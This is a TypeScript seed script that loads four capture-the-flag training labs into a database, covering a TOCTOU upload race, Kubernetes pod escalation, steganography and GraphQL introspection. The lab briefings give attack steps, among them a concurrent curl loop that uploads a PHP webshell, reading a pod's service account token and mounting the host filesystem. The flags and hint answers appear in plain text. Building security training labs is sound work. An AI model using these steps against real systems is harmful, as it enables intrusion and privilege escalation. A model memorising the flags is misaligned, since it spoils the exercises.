import { db } from "../src/lib/db"

const NEW_LABS = [
  {
    title: "Race Condition — TOCTOU Exploitation",
    slug: "race-condition-toctou",
    category: "Web Security",
    difficulty: "Hard",
    durationMin: 40,
    points: 300,
    description: "Exploit a Time-of-Check to Time-of-Use race condition to bypass a file upload restriction.",
    longDescription:
      "A web app checks file extensions before saving, but a race condition exists between the check and the save. Exploit the TOCTOU window to upload a PHP webshell.",
    scenario:
      "## Mission Briefing\n\nTarget: `http://vulnlab.local/upload`\n\nThe upload handler:\n1. Checks if the file extension is allowed\n2. Saves the file to `/uploads/`\n3. Renames if it ends in .php\n\nBetween steps 2 and 3, the file is accessible. Send many concurrent uploads of `shell.php` to win the race.\n\nUse: `for i in $(seq 1 50); do curl -F 'file=@shell.php' http://vulnlab.local/upload & done`",
    objectives: "Identify the race window|Upload shell.php during the window|Execute the shell|Read the flag",
    hints: "Upload + rename has a gap|Send 50+ concurrent requests|Access /uploads/shell.php before rename|The flag is in /var/www/flag.txt",
    flag: "FLAG{r4c3_c0nd1t10n_t0ct0u}",
    commands: "whoami|curl|nc|help",
    color: "violet",
  },
  {
    title: "Kubernetes Pod Escalation",
    slug: "k8s-pod-escalation",
    category: "Cloud Security",
    difficulty: "Hard",
    durationMin: 50,
    points: 400,
    description: "Exploit an over-privileged Kubernetes service account to escalate to cluster admin.",
    longDescription:
      "You have a shell in a Kubernetes pod with a mounted service account token that has excessive RBAC permissions. Use kubectl to enumerate the cluster and escalate to cluster-admin.",
    scenario:
      "## Mission Briefing\n\nYou're inside a pod with a service account token mounted at `/var/run/secrets/kubernetes.io/serviceaccount/`.\n\n1. Read the token: `cat /var/run/secrets/kubernetes.io/serviceaccount/token`\n2. Check your permissions: `kubectl auth can-i --list`\n3. Notice you can create pods — create a pod that mounts the host filesystem\n4. Exec into it and read `/host/root/flag.txt`\n\nSet KUBE_TOKEN and KUBE_API vars from the token and API server IP.",
    objectives: "Read service account token|Check RBAC permissions|Create privileged pod|Read host flag",
    hints: "Token is at /var/run/secrets/kubernetes.io/serviceaccount/token|kubectl auth can-i --list|Create a pod with hostPath volume mount|Access /host/root/flag.txt",
    flag: "FLAG{k8s_p0d_3sc4l4t10n}",
    commands: "whoami|cat|kubectl|curl|help",
    color: "cyan",
  },
  {
    title: "Steganography — Hidden in Plain Sight",
    slug: "steganography-hidden",
    category: "Cryptography",
    difficulty: "Medium",
    durationMin: 30,
    points: 200,
    description: "Extract a hidden flag from an image using steganalysis tools.",
    longDescription:
      "An image file contains a hidden message encoded with steganography. Use tools like steghide, binwalk, and zsteg to extract the flag.",
    scenario:
      "## Mission Briefing\n\nFile: `/home/guardian/secret.png`\n\n1. Check for embedded files: `binwalk secret.png`\n2. Try steghide: `steghide extract -sf secret.png -p ''`\n3. Check LSB encoding: `zsteg secret.png`\n4. The flag is hidden in the LSB of the blue channel",
    objectives: "Analyze the image with binwalk|Try steghide extraction|Check LSB with zsteg|Extract the flag",
    hints: "binwalk looks for embedded files|steghide -sf with empty password|zsteg checks LSB encoding|Flag is in blue channel LSBs",
    flag: "FLAG{st3g0_h1dd3n_1n_pl41n_s1ght}",
    commands: "whoami|file|binwalk|steghide|zsteg|strings|help",
    color: "amber",
  },
  {
    title: "GraphQL Introspection & Injection",
    slug: "graphql-introspection",
    category: "Web Security",
    difficulty: "Medium",
    durationMin: 35,
    points: 250,
    description: "Abuse GraphQL introspection to map the API schema and exploit a mutation.",
    longDescription:
      "A GraphQL API has introspection enabled. Enumerate the schema to find a hidden mutation that returns the flag when called with the right parameters.",
    scenario:
      "## Mission Briefing\n\nTarget: `http://vulnlab.local/graphql`\n\n1. Query introspection:\n```graphql\n{ __schema { types { name fields { name type { name } } } } }\n```\n2. Find the `getFlag` mutation in the schema\n3. Call it with the required `secretKey` parameter\n4. The secretKey is 'guardianx' (hint: check the description field)",
    objectives: "Enumerate GraphQL schema|Find hidden mutation|Call with correct parameters|Get the flag",
    hints: "Use __schema { types { name fields { name } } }|Look for non-standard mutations|Check field descriptions for hints|The secretKey is 'guardianx'",
    flag: "FLAG{gr4phql_1ntr0sp3ct10n}",
    commands: "whoami|curl|help",
    color: "violet",
  },
]

async function main() {
  console.log("Adding new labs...")
  let added = 0
  for (const lab of NEW_LABS) {
    const existing = await db.lab.findUnique({ where: { slug: lab.slug } })
    if (!existing) {
      await db.lab.create({ data: lab })
      added++
      console.log(`  + ${lab.title}`)
    } else {
      console.log(`  = ${lab.title} (exists)`)
    }
  }
  console.log(`Done. Added ${added} new labs.`)
}

main()
  .catch((e) => { console.error(e); process.exit(1) })
  .finally(async () => { await db.$disconnect() })
